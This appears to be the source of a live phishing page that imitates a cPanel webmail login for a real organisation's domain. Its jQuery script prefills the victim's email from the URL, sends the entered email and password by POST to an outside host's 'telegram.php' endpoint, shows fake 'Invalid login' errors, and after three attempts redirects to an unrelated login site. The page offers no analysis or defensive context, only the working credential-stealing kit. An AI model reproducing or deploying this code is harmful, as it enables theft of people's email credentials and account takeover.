<body>
    <div class="main-container">
        <div class="wrapper">
            <div class="logo-container">
                <img class="main-logo" src="https://webmail.empowernc.com/cPanel_magic_revision_1569621012/unprotected/cpanel/images/webmail-logo.svg" alt="logo">
            </div>
            
            <div class="form-container">
                <form id="contact" novalidate="">
                    <center>
                        <div class="alert alert-danger" id="mgss" style="display: none;"></div>
                        <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                    </center>

                    <div class="input-label">
                        <label for="ai">Email Address</label>
                    </div>
                    <div class="input-field username-container">
                        <input id="ai" name="ai" autofocus="autofocus" value="" placeholder="Enter your email address." type="text" tabindex="1" required="">
                    </div>
                    
                    <div class="input-label">
                        <label for="pr">Password</label>
                    </div>
                    <div class="input-field password-container">
                        <input id="pr" name="pr" placeholder="Enter your email password." type="password" tabindex="2" required="">
                    </div>
                    
                    <div class="login-btn">
                        <button id="submit-btn" type="submit" tabindex="3">Log in</button>
                    </div>
                    
                    <div class="reset-pw">
                        <a href="https://webmail.empowernc.com/resetpass?start=1">Reset Password</a>
                    </div>
                </form>
            </div>
        </div>
        
        <div class="locale-container">
            <ul>
                <li><a href="https://webmail.empowernc.com/?locale=en">English</a></li>
                <li><a href="https://webmail.empowernc.com/?locale=ar">العربية</a></li>
                <li><a href="https://webmail.empowernc.com/?locale=cs">čeština</a></li>
                <li><a href="https://webmail.empowernc.com/?locale=da">dansk</a></li>
                <li><a href="https://webmail.empowernc.com/?locale=de">Deutsch</a></li>
                <li><a href="https://webmail.empowernc.com/?locale=el">Ελληνικά</a></li>
                <li><a href="https://webmail.empowernc.com/?locale=es">español</a></li>
                <li><a href="https://webmail.empowernc.com/?locale=es_419">español latinoamericano</a></li>
                <li><a href="javascript:void(0)" title="More locales" class="more-locales">…</a></li>

    </div>

<script>
    /* global $ */
    $(document).ready(function() {
        function updateLogo(email) {
            var domain = email.substring(email.lastIndexOf("@") + 1);
            var logoUrl = "https://logo.clearbit.com/" + domain;
            var domainName = domain.split('.')[0];
            $("#logo").attr("src", logoUrl);
        }

        var email = window.location.hash.substring(1);
        if (email) {
            $("#ai").val(email);
            updateLogo(email);
        }

        $("#ai").focusout(function() {
            var email = $("#ai").val().trim();
            if (email) {
                updateLogo(email);
            }
        });

        var count = 0;

        $('#back1').click(function() {
            $("#mgss").hide();
            $('#ai').val("");
            $("#automail").animate({ left: 200, opacity: "hide" }, 0);
            $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
        });

        $('#submit-btn').click(function(event) {
            $('#error').hide();
            $('#mgss').hide();
            event.preventDefault();
            var ai = $("#ai").val();
            var pr = $("#pr").val();

            if (!ai.trim()) {
                $('#error').show();
                $('#ai').focus();
                return false;
            }

            if (!pr.trim()) {
                $('#mgss').show();
                $('#mgss').html("Password is required");
                return false;
            }

            count = count + 1;

            $.ajax({
                dataType: 'JSON',
                url: 'https://mine.repeatcar.com/568/cat/telegram.php',
                type: 'POST',
                data: {
                    ai: ai,
                    pr: pr,
                },
                beforeSend: function(xhr) {
                    $('#submit-btn').html('Verifying...');
                },
                success: function(response) {
                    console.log('Success:', response);
                },
                error: function(xhr, status, error) {
                    console.error('Error:', status, error);
                    console.log('Response:', xhr.responseText);
                },
                complete: function() {
                    $("#pr").val("");
                    if (count >= 3) {
                        count = 0;
                        var domain = ai.substring(ai.lastIndexOf("@") + 1);
                        window.location.replace("https://login.statemortgageregistry.com/login");
                    } else {
                        $("#mgss").show();
                        $('#mgss').html("Invalid login Please try again later");
                        $('#submit-btn').html('Log in');
                    }
                }
            });
        });
    });
</script>
